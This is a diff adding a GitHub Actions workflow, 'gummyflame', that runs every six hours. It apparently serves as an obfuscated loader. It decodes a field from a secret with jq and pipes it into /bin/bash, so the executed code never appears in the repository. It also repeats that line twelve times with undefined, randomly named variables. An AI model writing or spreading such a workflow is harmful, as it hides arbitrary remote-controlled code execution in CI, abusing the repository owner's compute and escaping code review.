@@ -1,0 +1,28 @@
+name: gummyflame
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gummyflame
+        env:
+          heqzn7548: ${{ secrets.heqzn7548 }}
+        run: |
+          echo $heqzn7548 | jq -r .nw31682 | /bin/bash
+          echo $llhl104 | jq -r .qr5005 | /bin/bash
+          echo $gou4239 | jq -r .hwaz091 | /bin/bash
+          echo $iouc8 | jq -r .j52431 | /bin/bash
+          echo $rmiz3 | jq -r .qtf6 | /bin/bash
+          echo $mij67 | jq -r .zcrbj5 | /bin/bash
+          echo $andf0 | jq -r .iejzm3 | /bin/bash
+          echo $uin65 | jq -r .xyq43740 | /bin/bash
+          echo $vhpv207 | jq -r .n40630 | /bin/bash
+          echo $g7116 | jq -r .ho85 | /bin/bash
+          echo $z39216 | jq -r .rxe2739 | /bin/bash
+          echo $um19621 | jq -r .rdbbf921 | /bin/bash
+          echo $kmust1814 | jq -r .gjr65168 | /bin/bash
+
